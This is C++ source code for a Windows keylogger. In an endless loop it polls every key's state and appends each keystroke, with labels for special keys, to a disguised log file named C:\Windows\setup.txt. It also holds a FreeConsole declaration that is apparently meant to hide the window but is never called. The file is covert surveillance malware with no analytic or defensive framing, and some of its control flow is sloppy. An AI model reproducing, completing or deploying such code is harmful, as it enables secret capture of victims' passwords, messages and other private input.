#include <iostream>
#include <fstream>
#include <windows.h>
#include <stdio.h>

using namespace std;

int main(int argc, char** argv) {
	int press;
	int keys;
	BOOL WINAPI FreeConsole(void);
	ofstream keyfile;
	keyfile.open("C:\\Windows\\setup.txt");

	
	if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0){
			keyfile<<"capslock is activated"<<endl;
			
		}
		
	while(1){
		backhere:
		for(keys=8; keys<=255; keys++){
			press = GetAsyncKeyState(keys);
			if(press == -32767){
				keyfile<<(char)keys<<endl;
				
		switch (keys){
		case VK_BACK:
			keyfile<<"backspace was pressed"<<endl;
			break;
		case VK_RETURN:
			keyfile<<"enter is pressed"<<endl;
			break;
		case VK_SHIFT:
			keyfile<<"shift is pressed"<<endl;
			break;
		case VK_CAPITAL:
			keyfile<<"capslock is pressed"<<endl;
			break;
		case VK_SPACE:
			keyfile<<" "<<endl;
			break;
		case VK_NUMPAD0:
			keyfile<<"numlock 0"<<endl;
			break;
		case VK_NUMPAD1:
			keyfile<<"numlock 1"<<endl;
			break; 
		case VK_NUMPAD2:
			keyfile<<"numlock 2"<<endl;
			break;
		case VK_NUMPAD3:
			keyfile<<"numlock 3"<<endl;
			break;
	 	case VK_NUMPAD4:
			keyfile<<"numlock 4"<<endl;
			break;
		case VK_NUMPAD5:
			keyfile<<"numlock 5"<<endl;
			break;
		case VK_NUMPAD6:
			keyfile<<"numlock 6"<<endl;
			break;
		case VK_NUMPAD7:
			keyfile<<"numlock 7"<<endl;
			break;
		case VK_NUMPAD8:
			keyfile<<"numlock 8"<<endl;
			break;
		case VK_NUMPAD9:
			keyfile<<"numlock 9"<<endl;
			break;
		case VK_TAB:
			keyfile<<"tab is pressed"<<endl;
		default:
		goto backhere;	
			
		}
	}
}
}
	
	return 0;
}
